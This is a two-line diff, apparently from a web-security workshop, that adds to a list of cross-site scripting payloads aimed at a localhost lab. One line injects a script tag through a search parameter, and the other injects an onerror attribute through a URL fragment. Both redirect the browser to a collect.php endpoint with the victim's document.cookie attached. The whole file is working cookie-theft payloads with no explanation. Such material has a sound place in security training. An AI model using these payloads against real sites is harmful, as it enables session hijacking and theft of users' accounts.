@@ -1,1 +1,2 @@
 ?search=<script>document.location="http://localhost/workshop/collect.php/?c="%2Bdocument.cookie</script>
+http://localhost/workshop/home2.php#1'%20onerror='document.location=%22http://localhost/workshop/collect.php/?c=%22+document.cookie';
